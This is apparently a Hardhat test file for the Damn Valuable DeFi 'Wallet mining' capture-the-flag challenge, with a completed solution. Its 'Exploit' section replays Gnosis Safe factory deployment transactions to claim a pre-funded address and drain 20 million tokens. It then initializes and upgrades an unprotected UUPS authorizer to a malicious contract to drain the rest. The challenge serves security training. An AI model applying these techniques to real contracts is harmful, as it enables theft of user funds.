const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { Factory, Copy, Upgrade } = require("./deployment.json");

describe("[Challenge] Wallet mining", function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (
            await ethers.getContractFactory("DamnValuableToken", deployer)
        ).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: "uups", initializer: "init" }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(
            await authorizer.can(player.address, DEPOSIT_ADDRESS)
        ).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (
            await ethers.getContractFactory("WalletDeployer", deployer)
        ).deploy(token.address);
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(
            walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
        ).not.to.be.reverted;
        await expect(
            walletDeployer.can(player.address, DEPOSIT_ADDRESS)
        ).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(
            43
        );
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.eq("0x");
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.eq("0x");

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it("Exploit", async function () {
        ///////////////////////////////////////////////////////////////////////////////////////////////
        //fund the factory deployer (this is the original GnosisSafeProxyFactory deployer from mainnet)
        await player.sendTransaction({
            from: player.address,
            to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
            value: ethers.utils.parseEther("1"),
        });
        //replay the transactions made by the deployer on mainnet
        await (await ethers.provider.sendTransaction(Copy)).wait();
        await (await ethers.provider.sendTransaction(Upgrade)).wait();
        //deploy the factory
        factory = await (await ethers.provider.sendTransaction(Factory)).wait();
        DeployedFactory = (
            await ethers.getContractFactory("GnosisSafeProxyFactory")
        ).attach(factory.contractAddress);
        //deploy the malicious wallet we created
        badWallet = await (await ethers.getContractFactory("BadWallet")).deploy();
        //encode the function to transferring the tokens from the wallet to attackerEOA
        const payload = new ethers.utils.Interface([
            "function exploit(address token, address attackerEOA)",
        ]).encodeFunctionData("exploit", [token.address, player.address]);
        //create the wallet and send the transaction at nonce 44
        for (let i = 1; i < 45; i++) {
            if (i == 43)
                depositWallet = await DeployedFactory.createProxy(badWallet.address, payload);
            await DeployedFactory.createProxy(badWallet.address, []); //increment nonce
        }
        //at this point we have drained 20 million tokens from the wallet
        ///////////////////////////////////////////////////////////////////////////////////////////////
        //Take over auth contract and upgrade it
        const authorizerUpgradeable = await (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(
            "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512"
        );
        await authorizerUpgradeable.connect(player).init([player.address], [token.address]);
        //upgrade the auth contract
        const badAuth = await (await ethers.getContractFactory("BadAuth")).deploy();
        let data = new ethers.utils.Interface([`function exploit()`]).encodeFunctionData("exploit", []);
        await authorizerUpgradeable.connect(player).upgradeToAndCall(badAuth.address, data);
        //drain 43 tokens left in the contract
        for (let i = 0; i < 43; i++) await walletDeployer.connect(player).drop([]);
        ///////////////////////////////////////////////////////////////////////////////////////////////
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq("0x");

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq("0x");

        // Deposit account must have code
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
        expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

        // Player must own all tokens
        expect(await token.balanceOf(player.address)).to.eq(
            initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
        );
    });
});
